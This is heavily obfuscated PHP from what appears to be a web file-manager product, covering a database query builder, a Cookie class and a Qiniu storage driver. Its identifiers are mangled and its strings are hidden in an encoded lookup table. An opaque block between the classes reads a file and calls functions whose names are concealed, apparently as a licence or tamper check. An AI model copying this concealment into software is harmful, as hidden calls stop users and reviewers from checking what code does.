$BËè®ÁÈÀ[$BŠ»ùº­ñ•]; if ($AÏÈ˜£²¦Œ[295] == strtolower($BËè®ÁÈÀ[$BŠ»ùº­ñ•][0])) { $E…”÷…Î .= $AÏÈ˜£²¦Œ[258] . $C‡Œ¯—‚â . $AÏÈ˜£²¦Œ[50] . $D‘¯´™ˆ¶Ó . $AÏÈ˜£²¦Œ[976] . $D¾¹¢‡„Ä¶ . $AÏÈ˜£²¦Œ[50]; } else { $AÅÙÊòçÚâ = is_array($BËè®ÁÈÀ[$BŠ»ùº­ñ•]) ? $this->exp[strtolower($BËè®ÁÈÀ[$BŠ»ùº­ñ•][0])] : $AÏÈ˜£²¦Œ[952]; if (!$AÅÙÊòçÚâ && is_array($BËè®ÁÈÀ[$BŠ»ùº­ñ•]) && in_array($BËè®ÁÈÀ[$BŠ»ùº­ñ•][0], array($AÏÈ˜£²¦Œ[952], $AÏÈ˜£²¦Œ[969], $AÏÈ˜£²¦Œ[970], $AÏÈ˜£²¦Œ[971], $AÏÈ˜£²¦Œ[972], $AÏÈ˜£²¦Œ[973]))) { $AÅÙÊòçÚâ = $BËè®ÁÈÀ[$BŠ»ùº­ñ•][0]; } $E…”÷…Î .= $AÏÈ˜£²¦Œ[258] . $C‡Œ¯—‚â . $AÏÈ˜£²¦Œ[50] . $AÅÙÊòçÚâ . $AÏÈ˜£²¦Œ[50] . $this->parseValue($D‘¯´™ˆ¶Ó) . $AÏÈ˜£²¦Œ[976] . $D¾¹¢‡„Ä¶ . $AÏÈ˜£²¦Œ[50]; } } $E…”÷…Î = substr($E…”÷…Î, 0, -4); } } else { $E…”÷…Î .= $C‡Œ¯—‚â . $AÏÈ˜£²¦Œ[980] . $this->parseValue($BËè®ÁÈÀ); } return $E…”÷…Î; } protected function parseThinkWhere($BÈ÷‘ô·áº, $d•Ë–÷±£Ï) { $bÊİÃ¥®Õš =& $_SERVER[«¾°Ã¤]; $f¬ÊÌå‡…ª = $bÊİÃ¥®Õš[33]; switch ($BÈ÷‘ô·áº) { case $bÊİÃ¥®Õš[350]: $f¬ÊÌå‡…ª = $d•Ë–÷±£Ï; break; case $bÊİÃ¥®Õš[963]: $f¬ÊÌå‡…ª = is_string($d•Ë–÷±£Ï) ? $d•Ë–÷±£Ï : substr($this->parseWhere($d•Ë–÷±£Ï), 6); break; case $bÊİÃ¥®Õš[981]: parse_str($d•Ë–÷±£Ï, $Bµ£¦‡Ş­Ç); if (isset($Bµ£¦‡Ş­Ç[$bÊİÃ¥®Õš[958]])) { $DÍé¼ †¶Ê = $bÊİÃ¥®Õš[50] . strtoupper($Bµ£¦‡Ş­Ç[$bÊİÃ¥®Õš[958]]) . $bÊİÃ¥®Õš[50]; unset($Bµ£¦‡Ş­Ç[$bÊİÃ¥®Õš[958]]); } else { $DÍé¼ †¶Ê = $bÊİÃ¥®Õš[962]; } $c™†âæÅåÌ = array(); foreach ($Bµ£¦‡Ş­Ç as $fñÅï¦›àÀ => $DÆ¥•ù‹æÆ) { $c™†âæÅåÌ[] = $this->parseKey($fñÅï¦›àÀ) . $bÊİÃ¥®Õš[980] . $this->parseValue($DÆ¥•ù‹æÆ); } $f¬ÊÌå‡…ª = implode($DÍé¼ †¶Ê, $c™†âæÅåÌ); break; } return $f¬ÊÌå‡…ª; } protected function parseLimit($Bï”ÚÑÔ‘) { $A…ŒŠ½¨—ø =& $_SERVER[«¾°Ã¤]; return !empty($Bï”ÚÑÔ‘) ? $A…ŒŠ½¨—ø[48] . $Bï”ÚÑÔ‘ . $A…ŒŠ½¨—ø[50] : $A…ŒŠ½¨—ø[33]; } protected function parseJoin($a³¼ö‡º¦) { $Cµã¿ãö‚ =& $_SERVER[«¾°Ã¤]; $e…¾—¯‘¬ = $Cµã¿ãö‚[33]; if (!empty($a³¼ö‡º¦)) { if (is_array($a³¼ö‡º¦)) { foreach ($a³¼ö‡º¦ as $e°çì„¡Ó => $Eº×¥–¤ÌÓ) { if (!1 !== stripos($Eº×¥–¤ÌÓ, $Cµã¿ãö‚[982])) { $e…¾—¯‘¬ .= $Cµã¿ãö‚[50] . $Eº×¥–¤ÌÓ; } else { $e…¾—¯‘¬ .= $Cµã¿ãö‚[983] . $Eº×¥–¤ÌÓ; } } } else { $e…¾—¯‘¬ .= $Cµã¿ãö‚[983] . $a³¼ö‡º¦; } } $e…¾—¯‘¬ = preg_replace($Cµã¿ãö‚[984], think_config($Cµã¿ãö‚[890]) . $Cµã¿ãö‚[985], $e…¾—¯‘¬); return $e…¾—¯‘¬; } protected function parseOrder($f«¦¥·÷£) { $CĞËƒ‘›ÆÁ =& $_SERVER[«¾°Ã¤]; if (is_array($f«¦¥·÷£)) { $A±«Ñ‡ÊÉ = array(); foreach ($f«¦¥·÷£ as $c“ñ„ä => $eçÆÂ±‘½À) { if (is_numeric($c“ñ„ä)) { $A±«Ñ‡ÊÉ[] = $this->parseKey($eçÆÂ±‘½À); } else { $eçÆÂ±‘½À = in_array(strtoupper(trim($eçÆÂ±‘½À)), array($CĞËƒ‘›ÆÁ[986], $CĞËƒ‘›ÆÁ[987])) ? $CĞËƒ‘›ÆÁ[50] . $eçÆÂ±‘½À : $CĞËƒ‘›ÆÁ[33]; if (preg_match($CĞËƒ‘›ÆÁ[988], $c“ñ„ä)) { $A±«Ñ‡ÊÉ[] = $this->parseKey($c“ñ„ä) . $eçÆÂ±‘½À; } else { think_exception($CĞËƒ‘›ÆÁ[989] . $c“ñ„ä); } } } $f«¦¥·÷£ = implode($CĞËƒ‘›ÆÁ[47], $A±«Ñ‡ÊÉ); } return !empty($f«¦¥·÷£) ? $CĞËƒ‘›ÆÁ[990] . $f«¦¥·÷£ : $CĞËƒ‘›ÆÁ[33]; } protected function parseGroup($f‰™§³¬İ‘) { $DÃÁğš¤® =& $_SERVER[«¾°Ã¤]; return !empty($f‰™§³¬İ‘) ? $DÃÁğš¤®[991] . $f‰™§³¬İ‘ : $DÃÁğš¤®[33]; } protected function parseHaving($b‚øö·Êá) { $cÄø¥õĞ„‹ =& $_SERVER[«¾°Ã¤]; return !empty($b‚øö·Êá) ? $cÄø¥õĞ„‹[992] . $b‚øö·Êá : $cÄø¥õĞ„‹[33]; } protected function parseComment($D›äÈÎÈ‚Ê) { $e‰¥Ò„§îé =& $_SERVER[«¾°Ã¤]; return !empty($D›äÈÎÈ‚Ê) ? $e‰¥Ò„§îé[993] . $D›äÈÎÈ‚Ê . $e‰¥Ò„§îé[994] : $e‰¥Ò„§îé[33]; } protected function parseDistinct($b‘ªÏ´Î«ñ) { $dˆ¬§â·¿É =& $_SERVER[«¾°Ã¤]; return !empty($b‘ªÏ´Î«ñ) ? $dˆ¬§â·¿É[995] : $dˆ¬§â·¿É[33]; } protected function parseUnion($EÈ¹ÊˆŞœ­) { $béàÛÓö÷· =& $_SERVER[«¾°Ã¤]; if (empty($EÈ¹ÊˆŞœ­)) { return $béàÛÓö÷·[33]; } if (isset($EÈ¹ÊˆŞœ­[$béàÛÓö÷·[346]])) { $e’ô¦ÃÓªí = $béàÛÓö÷·[996]; unset($EÈ¹ÊˆŞœ­[$béàÛÓö÷·[346]]); } else { $e’ô¦ÃÓªí = $béàÛÓö÷·[997]; } foreach ($EÈ¹ÊˆŞœ­ as $Fôù¹Ùµ) { $BÔğ‰Ÿ°ãè[] = $e’ô¦ÃÓªí . (is_array($Fôù¹Ùµ) ? $this->buildSelectSql($Fôù¹Ùµ) : $Fôù¹Ùµ); } return implode($béàÛÓö÷·[50], $BÔğ‰Ÿ°ãè); } public function insert($BÚË˜ğšÙ‚, $f¿¨ö«—™Ù = array(), $A’˜ùÚŒÆã = false) { goto DÑøïÌÖè×; bÖ¶Š­Ğœ»: foreach ($BÚË˜ğšÙ‚ as $Dè˜ãèÒË => $F¨è¿»½±) { if (is_array($F¨è¿»½±) && $cêó´ŞŞêÀ[295] == $F¨è¿»½±[0]) { $CŒÕø¥ƒô[] = $this->parseKey($Dè˜ãèÒË); $Eè†ãÜ©Æ[] = $F¨è¿»½±[1]; } elseif (is_scalar($F¨è¿»½±) || is_null($F¨è¿»½±)) { $CŒÕø¥ƒô[] = $this->parseKey($Dè˜ãèÒË); $Eè†ãÜ©Æ[] = $this->parseValue($F¨è¿»½±); } } $fÈæ†ªõÓ‘ = ($A’˜ùÚŒÆã ? $cêó´ŞŞêÀ[868] : $cêó´ŞŞêÀ[869]) . $cêó´ŞŞêÀ[870] . $this->parseTable($f¿¨ö«—™Ù[$cêó´ŞŞêÀ[277]]) . $cêó´ŞŞêÀ[864] . implode($cêó´ŞŞêÀ[47], $CŒÕø¥ƒô) . $cêó´ŞŞêÀ[865] . implode($cêó´ŞŞêÀ[47], $Eè†ãÜ©Æ) . $cêó´ŞŞêÀ[866]; $fÈæ†ªõÓ‘ .= $this->parseLock(isset($f¿¨ö«—™Ù[$cêó´ŞŞêÀ[821]]) ? $f¿¨ö«—™Ù[$cêó´ŞŞêÀ[821]] : !1); goto Bö’º¬Ÿá; Bö’º¬Ÿá: $fÈæ†ªõÓ‘ .= $this->parseComment(!empty($f¿¨ö«—™Ù[$cêó´ŞŞêÀ[352]]) ? $f¿¨ö«—™Ù[$cêó´ŞŞêÀ[352]] : $cêó´ŞŞêÀ[33]); return $this->execute($fÈæ†ªõÓ‘, $this->parseBind(!empty($f¿¨ö«—™Ù[$cêó´ŞŞêÀ[283]]) ? $f¿¨ö«—™Ù[$cêó´ŞŞêÀ[283]] : array())); goto F¦âÙ¥ç‰Ù; DÑøïÌÖè×: $cêó´ŞŞêÀ =& $_SERVER[«¾°Ã¤]; $Eè†ãÜ©Æ = $CŒÕø¥ƒô = array(); $this->model = $f¿¨ö«—™Ù[$cêó´ŞŞêÀ[279]]; goto bÖ¶Š­Ğœ»; F¦âÙ¥ç‰Ù: } public function selectInsert($F£±äğ„Ù, $AŠÄñ¡Ÿ“‘, $Få®«Ûó’÷ = array()) { goto d£ò±×‡Ê‰; cå¬»àÙ£: array_walk($F£±äğ„Ù, array($this, $déâêÈç¦˜[867])); $F¬×¨¢Ê¾È = $déâêÈç¦˜[998] . $this->parseTable($AŠÄñ¡Ÿ“‘) . $déâêÈç¦˜[864] . implode($déâêÈç¦˜[47], $F£±äğ„Ù) . $déâêÈç¦˜[976]; $F¬×¨¢Ê¾È .= $this->buildSelectSql($Få®«Ûó’÷); goto b†©±‚Ğ³ƒ; b†©±‚Ğ³ƒ: return $this->execute($F¬×¨¢Ê¾È, $this->parseBind(!empty($Få®«Ûó’÷[$déâêÈç¦˜[283]]) ? $Få®«Ûó’÷[$déâêÈç¦˜[283]] : array())); goto D·šñĞ±ˆ«; d£ò±×‡Ê‰: $déâêÈç¦˜ =& $_SERVER[«¾°Ã¤]; $this->model = $Få®«Ûó’÷[$déâêÈç¦˜[279]]; if (is_string($F£±äğ„Ù)) { $F£±äğ„Ù = explode($déâêÈç¦˜[47], $F£±äğ„Ù); } goto cå¬»àÙ£; D·šñĞ±ˆ«: } public function update($fÓŠôòù‰Ò, $bİåâ—Ï§) { $D«°¯ïéø =& $_SERVER[«¾°Ã¤]; $this->model = $bİåâ—Ï§[$D«°¯ïéø[279]]; $B“±æÉâµù = $D«°¯ïéø[999] . $this->parseTable($bİåâ—Ï§[$D«°¯ïéø[277]]) . $this->parseSet($fÓŠôòù‰Ò) . $this->parseWhere(!empty($bİåâ—Ï§[$D«°¯ïéø[273]]) ? $bİåâ—Ï§[$D«°¯ïéø[273]] : $D«°¯ïéø[33]) . $this->parseOrder(!empty($bİåâ—Ï§[$D«°¯ïéø[363]]) ? $bİåâ—Ï§[$D«°¯ïéø[363]] : $D«°¯ïéø[33]) . $this->parseLimit(!empty($bİåâ—Ï§[$D«°¯ïéø[290]]) ? $bİåâ—Ï§[$D«°¯ïéø[290]] : $D«°¯ïéø[33]) . $this->parseLock(isset($bİåâ—Ï§[$D«°¯ïéø[821]]) ? $bİåâ—Ï§[$D«°¯ïéø[821]] : !1) . $this->parseComment(!empty($bİåâ—Ï§[$D«°¯ïéø[352]]) ? $bİåâ—Ï§[$D«°¯ïéø[352]] : $D«°¯ïéø[33]); return $this->execute($B“±æÉâµù, $this->parseBind(!empty($bİåâ—Ï§[$D«°¯ïéø[283]]) ? $bİåâ—Ï§[$D«°¯ïéø[283]] : array())); } public function delete($F¨¤Ÿ÷ÏÂê = array()) { $b×¤ŞÂ¤ =& $_SERVER[«¾°Ã¤]; $this->model = $F¨¤Ÿ÷ÏÂê[$b×¤ŞÂ¤[279]]; $F£²£µ‡ñ– = $b×¤ŞÂ¤[1000] . $this->parseTable($F¨¤Ÿ÷ÏÂê[$b×¤ŞÂ¤[277]]) . $this->parseWhere(!empty($F¨¤Ÿ÷ÏÂê[$b×¤ŞÂ¤[273]]) ? $F¨¤Ÿ÷ÏÂê[$b×¤ŞÂ¤[273]] : $b×¤ŞÂ¤[33]) . $this->parseOrder(!empty($F¨¤Ÿ÷ÏÂê[$b×¤ŞÂ¤[363]]) ? $F¨¤Ÿ÷ÏÂê[$b×¤ŞÂ¤[363]] : $b×¤ŞÂ¤[33]) . $this->parseLimit(!empty($F¨¤Ÿ÷ÏÂê[$b×¤ŞÂ¤[290]]) ? $F¨¤Ÿ÷ÏÂê[$b×¤ŞÂ¤[290]] : $b×¤ŞÂ¤[33]) . $this->parseLock(isset($F¨¤Ÿ÷ÏÂê[$b×¤ŞÂ¤[821]]) ? $F¨¤Ÿ÷ÏÂê[$b×¤ŞÂ¤[821]] : !1) . $this->parseComment(!empty($F¨¤Ÿ÷ÏÂê[$b×¤ŞÂ¤[352]]) ? $F¨¤Ÿ÷ÏÂê[$b×¤ŞÂ¤[352]] : $b×¤ŞÂ¤[33]); return $this->execute($F£²£µ‡ñ–, $this->parseBind(!empty($F¨¤Ÿ÷ÏÂê[$b×¤ŞÂ¤[283]]) ? $F¨¤Ÿ÷ÏÂê[$b×¤ŞÂ¤[283]] : array())); } public function select($EŸìÇç‡î³ = array()) { goto Dš‘•º ®; Dš‘•º ®: $aÙ—ˆÁŞÖÎ =& $_SERVER[«¾°Ã¤]; $this->model = $EŸìÇç‡î³[$aÙ—ˆÁŞÖÎ[279]]; $bã…ß¬ŠØ¬ = $this->buildSelectSql($EŸìÇç‡î³); goto bœÌ‚ÎñÊ·; bœÌ‚ÎñÊ·: $fœì›¦ãŠ© = isset($EŸìÇç‡î³[$aÙ—ˆÁŞÖÎ[347]]) ? $EŸìÇç‡î³[$aÙ—ˆÁŞÖÎ[347]] : !1; if ($fœì›¦ãŠ©) { $cŠõšø³ƒ = is_string($fœì›¦ãŠ©[$aÙ—ˆÁŞÖÎ[93]]) ? $fœì›¦ãŠ©[$aÙ—ˆÁŞÖÎ[93]] : $aÙ—ˆÁŞÖÎ[1001] . md5($bã…ß¬ŠØ¬); $aµÇÙî¶î = think_cache($cŠõšø³ƒ, $aÙ—ˆÁŞÖÎ[33], $fœì›¦ãŠ©); if (!1 !== $aµÇÙî¶î) { return $aµÇÙî¶î; } } $cÌøŠ“¹³† = $this->query($bã…ß¬ŠØ¬, $this->parseBind(!empty($EŸìÇç‡î³[$aÙ—ˆÁŞÖÎ[283]]) ? $EŸìÇç‡î³[$aÙ—ˆÁŞÖÎ[283]] : array())); goto c‹ƒéëÉ; c‹ƒéëÉ: if ($fœì›¦ãŠ© && !1 !== $cÌøŠ“¹³†) { think_cache($cŠõšø³ƒ, $cÌøŠ“¹³†, $fœì›¦ãŠ©); } return $cÌøŠ“¹³†; goto a¬Û“ÒÒÈˆ; a¬Û“ÒÒÈˆ: } public function buildSelectSql($c‹±Ö¡°±´ = array()) { goto d‰¶…‚°; e¦öÉ®à§: $fÊÔä»²›™ = $this->parseSql($this->selectSql, $c‹±Ö¡°±´); $fÊÔä»²›™ .= $this->parseLock(isset($c‹±Ö¡°±´[$b‡Ä”ß¼ìŒ[821]]) ? $c‹±Ö¡°±´[$b‡Ä”ß¼ìŒ[821]] : !1); if (isset($dÍæÛóö‚•)) { think_cache($dÍæÛóö‚•, $fÊÔä»²›™); } goto BšùÒ¼ÚÑÃ; d‰¶…‚°: $b‡Ä”ß¼ìŒ =& $_SERVER[«¾°Ã¤]; if (isset($c‹±Ö¡°±´[$b‡Ä”ß¼ìŒ[351]])) { if (strpos($c‹±Ö¡°±´[$b‡Ä”ß¼ìŒ[351]], $b‡Ä”ß¼ìŒ[47])) { list($AÕÓ…‰³Ëó, $EÏåš„ŞËÔ) = explode($b‡Ä”ß¼ìŒ[47], $c‹±Ö¡°±´[$b‡Ä”ß¼ìŒ[351]]); } else { $AÕÓ…‰³Ëó = $c‹±Ö¡°±´[$b‡Ä”ß¼ìŒ[351]]; } $AÕÓ…‰³Ëó = $AÕÓ…‰³Ëó ? $AÕÓ…‰³Ëó : 1; $EÏåš„ŞËÔ = isset($EÏåš„ŞËÔ) ? $EÏåš„ŞËÔ : (is_numeric($c‹±Ö¡°±´[$b‡Ä”ß¼ìŒ[290]]) ? $c‹±Ö¡°±´[$b‡Ä”ß¼ìŒ[290]] : 20); $D¦ Şå—Ëí = $EÏåš„ŞËÔ * ((int) $AÕÓ…‰³Ëó - 1); $c‹±Ö¡°±´[$b‡Ä”ß¼ìŒ[290]] = $D¦ Şå—Ëí . $b‡Ä”ß¼ìŒ[47] . $EÏåš„ŞËÔ; } if (think_config($b‡Ä”ß¼ìŒ[1002])) { $dÍæÛóö‚• = $b‡Ä”ß¼ìŒ[1003] . md5(serialize($c‹±Ö¡°±´)); $b×š»¶Ë™ = think_cache($dÍæÛóö‚•); if ($b×š»¶Ë™) { return $b×š»¶Ë™; } } goto e¦öÉ®à§; BšùÒ¼ÚÑÃ: return $fÊÔä»²›™; goto Cƒ¯Şã‰­; Cƒ¯Şã‰­: } public function parseSql($Eß‘Üµ¸å¨, $cÍ´©ÁÆ”ì = array()) { $D³¸¤Ÿ¦½î =& $_SERVER[«¾°Ã¤]; $Eß‘Üµ¸å¨ = str_replace(array($D³¸¤Ÿ¦½î[1004], $D³¸¤Ÿ¦½î[1005], $D³¸¤Ÿ¦½î[1006], $D³¸¤Ÿ¦½î[1007], $D³¸¤Ÿ¦½î[1008], $D³¸¤Ÿ¦½î[1009], $D³¸¤Ÿ¦½î[1010], $D³¸¤Ÿ¦½î[1011], $D³¸¤Ÿ¦½î[1012], $D³¸¤Ÿ¦½î[1013], $D³¸¤Ÿ¦½î[1014]), array($this->parseTable("{$cÍ´©ÁÆ”ì[$D³¸¤Ÿ¦½î[277]]}"), $this->parseDistinct(isset($cÍ´©ÁÆ”ì[$D³¸¤Ÿ¦½î[1015]]) ? $cÍ´©ÁÆ”ì[$D³¸¤Ÿ¦½î[1015]] : !1), $this->parseField(!empty($cÍ´©ÁÆ”ì[$D³¸¤Ÿ¦½î[271]]) ? $cÍ´©ÁÆ”ì[$D³¸¤Ÿ¦½î[271]] : $D³¸¤Ÿ¦½î[182]), $this->parseJoin(!empty($cÍ´©ÁÆ”ì[$D³¸¤Ÿ¦½î[280]]) ? $cÍ´©ÁÆ”ì[$D³¸¤Ÿ¦½î[280]] : $D³¸¤Ÿ¦½î[33]), $this->parseWhere(!empty($cÍ´©ÁÆ”ì[$D³¸¤Ÿ¦½î[273]]) ? $cÍ´©ÁÆ”ì[$D³¸¤Ÿ¦½î[273]] : $D³¸¤Ÿ¦½î[33]), $this->parseGroup(!empty($cÍ´©ÁÆ”ì[$D³¸¤Ÿ¦½î[1016]]) ? $cÍ´©ÁÆ”ì[$D³¸¤Ÿ¦½î[1016]] : $D³¸¤Ÿ¦½î[33]), $this->parseHaving(!empty($cÍ´©ÁÆ”ì[$D³¸¤Ÿ¦½î[1017]]) ? $cÍ´©ÁÆ”ì[$D³¸¤Ÿ¦½î[1017]] : $D³¸¤Ÿ¦½î[33]), $this->parseOrder(!empty($cÍ´©ÁÆ”ì[$D³¸¤Ÿ¦½î[363]]) ? $cÍ´©ÁÆ”ì[$D³¸¤Ÿ¦½î[363]] : $D³¸¤Ÿ¦½î[33]), $this->parseLimit(!empty($cÍ´©ÁÆ”ì[$D³¸¤Ÿ¦½î[290]]) ? $cÍ´©ÁÆ”ì[$D³¸¤Ÿ¦½î[290]] : $D³¸¤Ÿ¦½î[33]), $this->parseUnion(!empty($cÍ´©ÁÆ”ì[$D³¸¤Ÿ¦½î[345]]) ? $cÍ´©ÁÆ”ì[$D³¸¤Ÿ¦½î[345]] : $D³¸¤Ÿ¦½î[33]), $this->parseComment(!empty($cÍ´©ÁÆ”ì[$D³¸¤Ÿ¦½î[352]]) ? $cÍ´©ÁÆ”ì[$D³¸¤Ÿ¦½î[352]] : $D³¸¤Ÿ¦½î[33])), $Eß‘Üµ¸å¨); return $Eß‘Üµ¸å¨; } public function getLastSql($c±êÂÄ‘§  = '') { return $c±êÂÄ‘§  ? $this->modelSql[$c±êÂÄ‘§ ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($c‘Ï³½äˆÂ) { return addslashes($c‘Ï³½äˆÂ); } public function setModel($CÏŠ¡„®ˆ) { $this->model = $CÏŠ¡„®ˆ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto e¥Úİ«õòØ; D²ÖŠÉÃËó: $E¼ãàÓñæ = $_SERVER[«¾°Ã¤][395]; if ($_SERVER[$_SERVER[«¾°Ã¤][396]] != $E¼ãàÓñæ($AÎ„ìÜß)) { goto E‹Ìæô»ğ; E‹Ìæô»ğ: $DÉÍŒÇÂŒ = $_SERVER[«¾°Ã¤][397]; $Aîì·»æÕ­ = $_SERVER[$_SERVER[«¾°Ã¤][398]] . $_SERVER[«¾°Ã¤][399]; $Dî‹‚ãÃéÇ = $DÉÍŒÇÂŒ($Aîì·»æÕ­); goto BÑ¨‡¶ñ¦¬; BÑ¨‡¶ñ¦¬: $FöÛÊ›¿ = explode($_SERVER[«¾°Ã¤][229], $Dî‹‚ãÃéÇ); if (count($FöÛÊ›¿) < $_SERVER[«¾°Ã¤][400]) { $Böéª’ÓñÎ = $_SERVER[«¾°Ã¤][401]; $Böéª’ÓñÎ(); } $A„÷„Å = $_SERVER[«¾°Ã¤][402]; goto F¢·âŒ—Ó¬; F¢·âŒ—Ó¬: $A„÷„Å($AÎ„ìÜß); goto c¿Ö®•§–‹; c¿Ö®•§–‹: } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($cÛˆº­‡ Ç = '', $e’ÛéÔ°ãŸ = 0) { if (is_string($cÛˆº­‡ Ç) && $cÛˆº­‡ Ç != $_SERVER[«¾°Ã¤][33]) { $this->prefix = $cÛˆº­‡ Ç; } if (is_numeric($e’ÛéÔ°ãŸ) && $e’ÛéÔ°ãŸ > 0) { $this->expire = $e’ÛéÔ°ãŸ; } } public static function getInstance() { static $aÎê…Ú«õğ; if ($aÎê…Ú«õğ === null) { $aÎê…Ú«õğ = new self(); } return $aÎê…Ú«õğ; } private static $cookieDisable = false; public static function disable($E‰äïóŞ£›) { self::$cookieDisable = $E‰äïóŞ£›; } private static $sameCookieSet = array(); public static function set($c½±‹´¾“™, $Aœ ‡ôó–, $A½ĞŒÆÙ‡ğ = 0, $F ª¬¯ñĞ = false, $DÄ¢‚ğ–ä’ = false) { goto AæÆí‡Á«Û; AæÆí‡Á«Û: $Cø‰¼òğª =& $_SERVER[«¾°Ã¤]; if (self::$cookieDisable) { return; } if (!$A½ĞŒÆÙ‡ğ) { $A½ĞŒÆÙ‡ğ = 24 * 3600 * 7; } goto f©È…×¬®µ; fçƒÕí•†Ì: $Dİ–ƒº‘² = $Cø‰¼òğª[33]; setcookie($c½±‹´¾“™, $Aœ ‡ôó–, time() + $A½ĞŒÆÙ‡ğ, $Cø‰¼òğª[8] . trim($DÄ¢‚ğ–ä’, $Cø‰¼òğª[8]) . $Dİ–ƒº‘², !1, !1, $F ª¬¯ñĞ); goto d™ÌŒˆÍ¨•; f©È…×¬®µ: if (isset(self::$sameCookieSet[$c½±‹´¾“™]) && self::$sameCookieSet[$c½±‹´¾“™] == $Aœ ‡ôó– . $A½ĞŒÆÙ‡ğ) { return; } self::$sameCookieSet[$c½±‹´¾“™] = $Aœ ‡ôó– . $A½ĞŒÆÙ‡ğ; if (!$DÄ¢‚ğ–ä’) { $DÄ¢‚ğ–ä’ = str_replace(HOST, $Cø‰¼òğª[33], APP_HOST); $DÄ¢‚ğ–ä’ = _get($GLOBALS, $Cø‰¼òğª[845], $DÄ¢‚ğ–ä’); } goto fçƒÕí•†Ì; d™ÌŒˆÍ¨•: } public static function setSafe($C¥ùµ’ŸÒ², $EÕÙ–ŒÆåÎ, $Fí­íÀ£… = 0) { self::set($C¥ùµ’ŸÒ², $EÕÙ–ŒÆåÎ, $Fí­íÀ£…, !0); } public static function get($D‚Ñ´Ì‚¯) { return isset($_COOKIE[$D‚Ñ´Ì‚¯]) ? $_COOKIE[$D‚Ñ´Ì‚¯] : !1; } public static function remove($E™”ÙÄéÌ, $E¸à‡Ë¢÷Ç = false) { unset($_COOKIE[$E™”ÙÄéÌ]); self::set($E™”ÙÄéÌ, $_SERVER[«¾°Ã¤][33], 1, $E¸à‡Ë¢÷Ç); } } goto Fˆ——ó…; e»ï‘¶»Ç‹: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($BĞÑ°ñ´) { parent::__construct(); require_once SDK_DIR . $_SERVER[«¾°Ã¤][1303]; $this->_init($BĞÑ°ñ´); } public function _init($d…„äÜî”) { goto fÜä©áô; fÜä©áô: $AŸÊ’Ñ¤—Ö =& $_SERVER[«¾°Ã¤]; foreach ($d…„äÜî” as $D‰×Ãİçø® => $f‘õŞÖ†ƒ®) { if (isset($this->{$D‰×Ãİçø®})) { $this->{$D‰×Ãİçø®} = $f‘õŞÖ†ƒ®; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($AŸÊ’Ñ¤—Ö[1304] . LNG($AŸÊ’Ñ¤—Ö[1263])); } goto bæ½Óµñ; DçÇÒçôŞ¾: $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); goto c«ˆÄŸôøî; bæ½Óµñ: $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); goto DçÇÒçôŞ¾; c«ˆÄŸôøî: } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($D‡…Œø«ÃŸ, $FÎîô½ñÀò = '', $BÇôŸÙ¯Œä = REPEAT_RENAME) { if ($this->setContent($D‡…Œø«ÃŸ, $FÎîô½ñÀò)) { return $this->getPathOuter($D‡…Œø«ÃŸ); } return !1; } public function mkdir($e½Ñ ê¾Á‡, $D¿Ä¥”‹ó¨ = REPEAT_SKIP) { goto F“ğŒÊ³’š; F“ğŒÊ³’š: $FöÌ•Ñ‡‰– =& $_SERVER[«¾°Ã¤]; $DÇƒ»Ö’×Š = trim($e½Ñ ê¾Á‡, $FöÌ•Ñ‡‰–[8]); if ($this->_isFolder($DÇƒ»Ö’×Š)) { return $this->getPathOuter($DÇƒ»Ö’×Š); } goto CŸ»àˆ‰¹; CÑ®¸èŸ–ª: if (!$this->mkfile($eÉ™ĞñŞ©ˆ)) { return !1; } if (!$this->moveFile($eÉ™ĞñŞ©ˆ, $e½Ñ ê¾Á‡)) { $this->delFile($eÉ™ĞñŞ©ˆ); return !1; } return $this->getPathOuter($DÇƒ»Ö’×Š); goto CÅåğõÏà; CŸ»àˆ‰¹: $e½Ñ ê¾Á‡ = $DÇƒ»Ö’×Š . $FöÌ•Ñ‡‰–[8]; $E¢ñÇ¨Õ¸Õ = get_path_this($DÇƒ»Ö’×Š); $eÉ™ĞñŞ©ˆ = $e½Ñ ê¾Á‡ . $E¢ñÇ¨Õ¸Õ; goto CÑ®¸èŸ–ª; CÅåğõÏà: } public function copyFile($f›æî‹Å, $dÑ¥§±ö¹Ú) { $d«¾†í´ = $this->bucketManager->copy($this->bucket, $f›æî‹Å, $this->bucket, $dÑ¥§±ö¹Ú, !0); return $d«¾†í´ ? !1 : $this->getPathOuter($dÑ¥§±ö¹Ú); } public function moveFile($c˜ªÚ©¸¾Ğ, $C»ìÕ‹ôÀŸ) { $Dî³†¹‹¡ã = $this->bucketManager->move($this->bucket, $c˜ªÚ©¸¾Ğ, $this->bucket, $C»ìÕ‹ôÀŸ, !0); return $Dî³†¹‹¡ã ? !1 : $this->getPathOuter($C»ìÕ‹ôÀŸ); } public function delFile($BÂ‘ëÏÃ‚ö) { if (!$this->exist($BÂ‘ëÏÃ‚ö)) { return !0; } $B–›±½ˆ¹¥ = $this->bucketManager->delete($this->bucket, $BÂ‘ëÏÃ‚ö); return $B–›±½ˆ¹¥ ? !1 : !0; } public function delFolder($F¹­ùˆ¦ˆ) { goto E„’ƒğÛó ; eƒÌŞÃÆÆ: if (!empty($F¹­ùˆ¦ˆ) && $F¹­ùˆ¦ˆ !== $FéŸ—‚Íª“[191] && !in_array($dË‰Õ˜ËÊ‘, $AØ÷˜ª¢è‚[$FéŸ—‚Íª“[75]])) { $AØ÷˜ª¢è‚[$FéŸ—‚Íª“[75]][] = $dË‰Õ˜ËÊ‘; } $fóó°“…§… = $this->delByBatch($AØ÷˜ª¢è‚[$FéŸ—‚Íª“[74]]); if (!$fóó°“…§…) { return !1; } goto aÌ ›Í¤¼Í; aÌ ›Í¤¼Í: $fóó°“…§… = $this->delByBatch($AØ÷˜ª¢è‚[$FéŸ—‚Íª“[75]]); if (!$fóó°“…§…) { return !1; } return 